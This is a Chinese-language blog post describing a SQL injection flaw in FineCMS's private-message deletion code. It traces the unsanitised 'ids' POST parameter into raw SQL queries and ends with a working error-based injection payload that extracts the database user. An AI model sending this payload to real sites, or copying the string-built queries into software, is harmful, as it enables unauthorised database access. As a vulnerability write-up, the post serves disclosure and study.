---
layout: post
title:  "Finecms SQL注入"
date:   2016-11-14 18:04:55
comments: true
categories: php bug
---
位置
{% highlight text %}
\member\controllers\Pm.php
{% endhighlight %}

控制器pm的index方法 ，调用了deletes 方法 ，并通过post方式传入参数ids

{% highlight php %}
public function index() {
if (IS_POST) {
if ($this->input->post('action') == 'read') {
$this->pm_model->set_read($this->uid, $this->input->post('ids'));
exit(dr_json(1, lang('000')));
} else {
$this->pm_model->deletes($this->uid, $this->input->post('ids'));
exit(dr_json(1, lang('000')));
}
}

{% endhighlight %}

跟踪deletes
{% highlight text %}
\member\models\Pm_model.php
{% endhighlight %}

此模型类的函数，调用了delete_by_plid
{% highlight php %}
public function deletes($uid, $plids, $isuser = 0) {
if ($plids) {
foreach($plids as $plid) {
$this->delete_by_plid($uid, $plid, $isuser);
}
}
return 1;
}
{% endhighlight %}

继续看delete_by_plid ，最终进行带入SELECT 查询

{% highlight php %}

public function delete_by_plid($uid, $plid, $isuser = 0) {
if (!$uid || !$plid) {
            return NULL;
        }
if ($isuser) {
$relationship = $this->_relationship($uid, $plid);
$sql = "SELECT * FROM ".$this->db->dbprefix('pm_lists')." WHERE min_max='$relationship'";
} else {
$sql = "SELECT * FROM ".$this->db->dbprefix('pm_lists')." WHERE plid='$plid'";
}
$list = $this->db->query($sql)->row_array();
if ($list) {
$user = explode('_', $list['min_max']);
if (!in_array($uid, $user)) {
                return NULL;
            }
} else {
return NULL;
}
$msg_table = $this->db->dbprefix($this->_pm_tablename($list['plid']));
if ($uid == $list['authorid']) {
$this->db->query("DELETE FROM ".$msg_table." WHERE plid='$list[plid]' AND delstatus=2");
$this->db->query("UPDATE ".$msg_table." SET delstatus=1 WHERE plid='$list[plid]' AND delstatus=0");
} else {
$this->db->query("DELETE FROM ".$msg_table." WHERE plid='$list[plid]' AND delstatus=1");
$this->db->query("UPDATE ".$msg_table." SET delstatus=2 WHERE plid='$list[plid]' AND delstatus=0");
}
$count = $this->db->where('plid', $list['plid'])->count_all_results($msg_table);
if(!$count) {
$this->db->query("DELETE FROM ".$this->db->dbprefix('pm_lists')." WHERE plid='$list[plid]'");
$this->db->query("DELETE FROM ".$this->db->dbprefix('pm_members')." WHERE plid='$list[plid]'");
$this->db->query("DELETE FROM ".$this->db->dbprefix('pm_indexes')." WHERE plid='$list[plid]'");
} else {
$this->db->query("DELETE FROM ".$this->db->dbprefix('pm_members')." WHERE plid='$list[plid]' AND uid=$uid");
}
return 1;
}
{% endhighlight %}

##复现漏洞
{% highlight text %}
http:///member/index.php?c=pm&m=index

action=&ids%5B%5D=1' union select 1 from (select count(*),concat(floor(rand(0)*2),(select user() limit 0,1))a from information_schema.tables group by a)b#

{% endhighlight %}
